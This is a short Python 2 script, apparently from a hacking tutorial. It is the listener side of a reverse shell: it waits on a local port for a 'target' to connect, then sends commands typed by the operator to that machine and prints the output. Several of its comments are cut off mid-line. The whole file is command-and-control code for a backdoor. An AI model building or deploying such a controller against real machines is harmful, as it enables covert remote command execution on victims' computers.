#!/usr/bin/python
import socket
import json

def reliable_send(data): # gets raw command input and sends command data to target
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv(): # recieve as much data as you want
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data) # does this until there are no more bytes left to recieve
		except ValueError: # if sent data > 1024 bytes, catches error and continues loop
			continue

def shell():
	while True:
		command = raw_input("* Shell#~%s: " % str(ip)) # allows user to enter command
		reliable_send(command) 
		if command == "q":
			break
		else:
			result = reliable_recv() # server can recieve up to 1024 bytes per message
			print(result)
 
def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # de>
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # >
	s.bind(("127.0.0.1", 54321)) # specifying localhost and po>
	s.listen(5) # listens for 5 connections
	print("Listening for incoming connections...")
	target, ip = s.accept() # accepts target (socket file desc>
	print("Target Connected")

server()
shell()
s.close()
